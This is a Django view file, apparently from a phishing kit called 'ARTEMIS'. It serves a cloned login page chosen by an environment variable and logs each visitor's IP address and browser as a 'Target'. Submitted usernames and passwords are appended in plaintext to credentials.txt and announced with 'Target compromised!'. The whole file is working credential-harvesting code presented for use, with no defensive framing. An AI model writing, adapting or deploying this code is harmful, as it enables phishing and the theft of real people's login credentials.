from django.shortcuts import render
from django.http import HttpResponse
import os
import datetime

from .utils import analyze, colorize


def index(request):
	if request.method == 'GET':
		# retrieve and print target ip address
		target_ip, browser = analyze(request)

		timestamp = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")

		with open('client.txt', 'a') as file:
			file.writelines([
				f'[ {timestamp} ]\n',
				f'Site: {os.environ.get("ARTEMIS_SITE", "")}\n',
				f'Target IP: {target_ip}\n',
				f'Browser: {browser}\n\n'
			])

		print(
			colorize('green', f'\nTarget connected!\n\n'),

			colorize('blue', 'Target IP:'),
			colorize('red',  target_ip + '\n'),
			
			colorize('blue', 'Browser:'),
			colorize('red', browser + '\n\n'),

			colorize('orange', 'Waiting for more...\n'),
		)

		site = os.environ.get('ARTEMIS_SITE')

		if site:
			return render(request, os.path.join(site, 'index.html'))
		else:
			return render(request, 'index.html')

	elif request.method == 'POST':
		# retrieve and print target ip address
		target_ip, browser = analyze(request)

		username = request.POST.get('username')
		password = request.POST.get('password')

		timestamp = datetime.datetime.now().strftime("%b %d %Y %H:%M:%S")

		with open('credentials.txt', 'a') as file:
			file.writelines([
				f'[ {timestamp} ]\n',
				f'Site: {os.environ.get("ARTEMIS_SITE", "")}\n',
				f'Target IP: {target_ip}\n',
				f'Username: {username}\n',
				f'Password: {password}\n',
				f'Browser: {browser}\n\n'
			])

		print(
			colorize('green', f'\nTarget compromised!\n\n'),

			colorize('blue', 'Target IP:'),
			colorize('red', target_ip + '\n'),

			colorize('blue', 'Username:'),
			colorize('red', username + '\n'),

			colorize('blue', 'Password:'),
			colorize('red', password + '\n'),

			colorize('blue', 'Browser:'),
			colorize('red', browser + '\n\n'),

			colorize('orange', 'Waiting for more...\n')
		)
	
		return HttpResponse('Recieved')